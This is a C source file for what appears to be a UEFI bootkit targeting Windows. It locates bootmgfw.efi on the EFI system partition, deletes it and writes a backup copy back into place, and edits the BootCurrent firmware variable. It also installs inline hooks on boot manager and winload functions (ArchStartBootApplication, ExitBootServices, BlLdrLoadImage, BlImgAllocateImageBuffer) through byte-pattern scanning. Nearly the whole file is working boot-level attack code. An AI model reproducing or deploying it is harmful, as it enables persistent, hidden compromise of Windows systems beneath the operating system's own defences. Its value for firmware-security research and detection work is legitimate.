#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/ShellLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include "PeStructs.h"
#include "Utils.h"
#include "BootMgfw.h"
#include "InlineHook.h"
#include "WinLoad.h"
#include <Guid/GlobalVariable.h>
#include <Library/PrintLib.h>

INLINE_HOOK BootMgfwShitHook = { 0 };

static EFI_STATUS EFIAPI ArchStartBootApplicationHook(VOID* AppEntry, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, VOID* ReturnArgs);

EFI_STATUS EFIAPI GetBootMgfwPath(/*UINT32 Index,*/ EFI_DEVICE_PATH_PROTOCOL** BootMgfwDevicePath)
{
	UINTN HandleCount = 0;
	EFI_STATUS Result;
	EFI_HANDLE* Handles = NULL;
	EFI_FILE_HANDLE VolumeHandle;
	EFI_FILE_HANDLE BootMgfwHandle;
	EFI_FILE_IO_INTERFACE* FileSystem = NULL;

	if (EFI_ERROR((Result = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles))))
		return Result;

	for (UINT32 Idx = 0u; Idx < HandleCount; Idx++)
	{
		if (EFI_ERROR((Result = gBS->OpenProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&FileSystem, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL))))
			return Result;

		if (EFI_ERROR((Result = FileSystem->OpenVolume(FileSystem, &VolumeHandle))))
			return Result;

		if (!EFI_ERROR(VolumeHandle->Open(VolumeHandle, &BootMgfwHandle, WINDOWS_BOOTMGFW_PATH, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY)))
		{
			VolumeHandle->Close(BootMgfwHandle);
			*BootMgfwDevicePath = AppendDevicePath(DevicePathFromHandle(Handles[Idx]), ConvertTextToDevicePath(WINDOWS_BOOTMGFW_PATH));// FileDevicePath(Handles[Idx], );
			return EFI_SUCCESS;
		}
		if (EFI_ERROR((Result = gBS->CloseProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, gImageHandle, NULL))))
			return Result;
	}
	return EFI_LOAD_ERROR;
}

EFI_STATUS EFIAPI RestoreBootMgfw(UINT32* Index)
{
	UINTN HandleCount = 0;
	EFI_STATUS Result;
	EFI_HANDLE* Handles = NULL;
	EFI_FILE_HANDLE VolumeHandle;
	EFI_FILE_HANDLE BootMgfwHandle;
	EFI_FILE_HANDLE BootMgfwHandleBack;
	EFI_FILE_IO_INTERFACE* FileSystem = NULL;
	UINTN BootMgfwSize = 0;

	if (EFI_ERROR((Result = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles))))
	{
		Print(L"error getting file system handles -> 0x%p\n", Result);
		return Result;
	}
		
	for (UINT32 Idx = 0u; Idx < HandleCount; ++Idx)
	{
		if (EFI_ERROR((Result = gBS->OpenProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&FileSystem, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL))))
		{
			Print(L"error opening protocol -> 0x%p\n", Result);
			continue;
		}
			
		if (EFI_ERROR((Result = FileSystem->OpenVolume(FileSystem, &VolumeHandle))))
		{		
			Print(L"error opening file system -> 0x%p\n", Result);
			continue;
		}
			
		if (!EFI_ERROR((Result = VolumeHandle->Open(VolumeHandle, &BootMgfwHandleBack, WINDOWS_BOOTMGFW_BACKUP_PATH, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY))))
		{
			if (!EFI_ERROR((Result = VolumeHandle->Open(VolumeHandle, &BootMgfwHandle, WINDOWS_BOOTMGFW_PATH, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY))))
			{
				VolumeHandle->Close(VolumeHandle);
				EFI_FILE_PROTOCOL* BootMgfwFile = NULL;
				EFI_DEVICE_PATH* BootMgfwPathProtocol = AppendDevicePath(DevicePathFromHandle(Handles[Idx]), ConvertTextToDevicePath(WINDOWS_BOOTMGFW_PATH));// FileDevicePath(Handles[Idx], WINDOWS_BOOTMGFW_PATH);

				//Print(L"opening bootmgfw... Length -> %u\n", BootMgfwPathProtocol->Length[0]);
				//Print(L"opening bootmgfw... SubType -> 0x%X\n", BootMgfwPathProtocol->SubType);
				//Print(L"opening bootmgfw... Type -> 0x%X\n", BootMgfwPathProtocol->Type);

				if (EFI_ERROR((Result = EfiOpenFileByDevicePath(&BootMgfwPathProtocol, &BootMgfwFile, EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ, 0))))
				{
					Print(L"error opening bootmgfw... reason -> %r\n", Result);
					continue;
				}

				if (EFI_ERROR((Result = BootMgfwFile->Delete(BootMgfwFile))))
				{
					Print(L"error deleting bootmgfw... reason -> %r\n", Result);
					continue;
				}

				if (Index)
					*Index = Idx;

				BootMgfwPathProtocol = AppendDevicePath(DevicePathFromHandle(Handles[Idx]), ConvertTextToDevicePath(WINDOWS_BOOTMGFW_BACKUP_PATH));//FileDevicePath(Handles[Idx], WINDOWS_BOOTMGFW_BACKUP_PATH);
				if (EFI_ERROR((Result = EfiOpenFileByDevicePath(&BootMgfwPathProtocol, &BootMgfwFile, EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ, 0))))
				{
					Print(L"failed to open backup file... reason -> %r\n", Result);
					continue;
				}

				EFI_FILE_INFO* FileInfoPtr = NULL;
				UINTN FileInfoSize = 0;
				if (EFI_ERROR((Result = BootMgfwFile->GetInfo(BootMgfwFile, &gEfiFileInfoGuid, &FileInfoSize, NULL))))
				{
					if (Result == EFI_BUFFER_TOO_SMALL)
					{
						gBS->AllocatePool(EfiBootServicesData, FileInfoSize, (void**)&FileInfoPtr);
						if (EFI_ERROR(Result = BootMgfwFile->GetInfo(BootMgfwFile, &gEfiFileInfoGuid, &FileInfoSize, FileInfoPtr)))
						{
							Print(L"get backup file information failed... reason -> %r\n", Result);
							return Result;
						}
					}
					else
					{
						Print(L"Failed to get file information... reason -> %r\n", Result);
						return Result;
					}
				}
				VOID* BootMgfwBuffer = NULL;
				if (!FileInfoPtr)
					continue;

				BootMgfwSize = FileInfoPtr->FileSize;
				gBS->AllocatePool(EfiBootServicesData, FileInfoPtr->FileSize, &BootMgfwBuffer);
				if (EFI_ERROR((Result = BootMgfwFile->Read(BootMgfwFile, &BootMgfwSize, BootMgfwBuffer))))
				{
					Print(L"Failed to read backup file into buffer... reason -> %r\n", Result);
					return Result;
				}

				if (EFI_ERROR((Result = BootMgfwFile->Delete(BootMgfwFile))))
				{
					Print(L"unable to delete backup file... reason -> %r\n", Result);
					return Result;
				}

				BootMgfwPathProtocol = AppendDevicePath(DevicePathFromHandle(Handles[Idx]), ConvertTextToDevicePath(WINDOWS_BOOTMGFW_PATH)); //FileDevicePath(Handles[Idx], WINDOWS_BOOTMGFW_PATH);
				if (EFI_ERROR((Result = EfiOpenFileByDevicePath(&BootMgfwPathProtocol, &BootMgfwFile, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ, EFI_FILE_SYSTEM))))
				{
					Print(L"unable to create new bootmgfw on disk... reason -> %r\n", Result);
					return Result;
				}

				BootMgfwSize = FileInfoPtr->FileSize;
				if (EFI_ERROR((Result = BootMgfwFile->Write(BootMgfwFile, &BootMgfwSize, BootMgfwBuffer))))
				{
					Print(L"unable to write to newly created bootmgfw.efi... reason -> %r\n", Result);
					return Result;
				}

				BootMgfwFile->Close(BootMgfwFile);
				gBS->FreePool(FileInfoPtr);
				gBS->FreePool(BootMgfwBuffer);
				return EFI_SUCCESS;
			}
		}
		if (EFI_ERROR((Result = gBS->CloseProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, gImageHandle, NULL))))
		{
			Print(L"error closing protocol -> 0x%p\n", Result);
			return Result;
		}		
	}
	gBS->FreePool(Handles);
	return EFI_ABORTED;
}

EFI_STATUS EFIAPI SetBootCurrentToWindowsBootmgr()
{
	UINTN bootOrderSize = 0;
	EFI_STATUS status = gRT->GetVariable(EFI_BOOT_ORDER_VARIABLE_NAME, &gEfiGlobalVariableGuid, NULL, &bootOrderSize, NULL);
	if (status != EFI_BUFFER_TOO_SMALL) 
		return status;
	
	UINT16* bootOrder = AllocatePool(bootOrderSize);
	if (!bootOrder) 
		return EFI_OUT_OF_RESOURCES;
	
	status = gRT->GetVariable(EFI_BOOT_ORDER_VARIABLE_NAME, &gEfiGlobalVariableGuid, NULL, &bootOrderSize, bootOrder);
	if (EFI_ERROR(status)) 
	{
		FreePool(bootOrder);
		return status;
	}

	BOOLEAN found = FALSE;
	for (UINTN i = 0; i < bootOrderSize / sizeof(bootOrder[0]) && !found; ++i) 
	{
		CHAR16 variableName[0xFF];
		UnicodeSPrint(variableName, sizeof(variableName), L"Boot%04x", bootOrder[i]);

		UINTN bufferSize = 0;
		status = gRT->GetVariable(variableName, &gEfiGlobalVariableGuid, NULL, &bufferSize, NULL);
		if (status != EFI_BUFFER_TOO_SMALL) 
			break;

		UINT8* buffer = AllocatePool(bufferSize);
		if (!buffer) 
		{
			status = EFI_OUT_OF_RESOURCES;
			break;
		}

		status = gRT->GetVariable(variableName, &gEfiGlobalVariableGuid, NULL, &bufferSize, buffer);
		if (EFI_ERROR(status)) 
		{
			FreePool(buffer);
			break;
		}

		EFI_LOAD_OPTION* bootOption = (EFI_LOAD_OPTION*)buffer;
		CHAR16* bootOptionDescription = (CHAR16*)(buffer + sizeof(EFI_LOAD_OPTION));
		EFI_DEVICE_PATH_PROTOCOL* bootOptionPaths = (EFI_DEVICE_PATH_PROTOCOL*)(bootOptionDescription + StrLen(bootOptionDescription) + 1);
		if (bootOption->FilePathListLength) 
		{
			CHAR16* bootOptionPath = ConvertDevicePathToText(&bootOptionPaths[0], FALSE, TRUE);
			if (bootOptionPath) 
			{
				for (CHAR16* c = bootOptionPath; *c; ++c) 
				{
					if (*c >= 'A' && *c <= 'Z') 
						*c += ('a' - 'A');
				}

				if (StrStr(bootOptionPath, WINDOWS_BOOTMGFW_PATH))
				{
					status = gRT->SetVariable(EFI_BOOT_CURRENT_VARIABLE_NAME, &gEfiGlobalVariableGuid, EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS, sizeof(UINT16), &bootOrder[i]);
					if (!EFI_ERROR(status)) 
						found = TRUE;
				}
				FreePool(bootOptionPath);
			}
		}
		FreePool(buffer);
	}

	FreePool(bootOrder);

	if (!EFI_ERROR(status) && !found) 
		status = EFI_NOT_FOUND;
	
	return status;
}


EFI_STATUS EFIAPI InstallBootMgfwHooks(EFI_HANDLE ImageHandle)
{
	EFI_STATUS Result = EFI_SUCCESS;
	EFI_LOADED_IMAGE* BootMgfw = NULL;
	if (EFI_ERROR(Result = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&BootMgfw)))
		return Result;

	VOID* ArchStartBootApplication = FindPattern((CHAR8*)BootMgfw->ImageBase, BootMgfw->ImageSize, START_BOOT_APPLICATION_SIG, START_BOOT_APPLICATION_MASK);
	if (!ArchStartBootApplication)
		return EFI_NOT_FOUND;

	UINT16 Revision = 0;
	if (EFI_ERROR(GetPeFileVersionInfo(BootMgfw->ImageBase, &BuildNumber, &Revision)))
		return EFI_UNSUPPORTED;

	Print(L"Build: %u Rev: %u\n", BuildNumber, Revision);
	MakeInlineHook(&BootMgfwShitHook, ArchStartBootApplication, &ArchStartBootApplicationHook, TRUE);
	return EFI_SUCCESS;
}

static EFI_STATUS EFIAPI ArchStartBootApplicationHook(VOID* AppEntry, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, VOID* ReturnArgs)
{
	DisableInlineHook(&BootMgfwShitHook);
	PIMAGE_DOS_HEADER DosHeader = NULL;
	PIMAGE_NT_HEADERS NtHeaders = NULL;
	UINT8* codeSection = NULL;
	UINT64 codeSize = 0;

	ExitBootServicesOriginal = gBS->ExitBootServices;
	gBS->ExitBootServices = ExitBootServicesHook;

	VOID* LdrLoadImage = GetExport(ImageBase, "BlLdrLoadImage");
	VOID* ImgAllocateImageBuffer = FindPattern((CHAR8*)ImageBase, ImageSize, ALLOCATE_IMAGE_BUFFER_SIG, ALLOCATE_IMAGE_BUFFER_MASK);
	if (!ImgAllocateImageBuffer)
	{
		ImgAllocateImageBuffer = FindPattern((CHAR8*)ImageBase, ImageSize, "\xE8\x00\x00\x00\x00\x4C\x8B\x6D\x60\x45\x33\xC9\x8B\xF8\x85\xC0", "x????xxxxxxxxxxx");
	}
	MakeInlineHook(&WinLoadImageShitHook, LdrLoadImage, &BlLdrLoadImage, TRUE);
	MakeInlineHook(&WinLoadAllocateImageHook, (VOID*)(RESOLVE_RVA(ImgAllocateImageBuffer, 5, 1)), &BlImgAllocateImageBuffer, TRUE);
	return ((IMG_ARCH_START_BOOT_APPLICATION)BootMgfwShitHook.Address)(AppEntry, ImageBase, ImageSize, BootOption, ReturnArgs);
}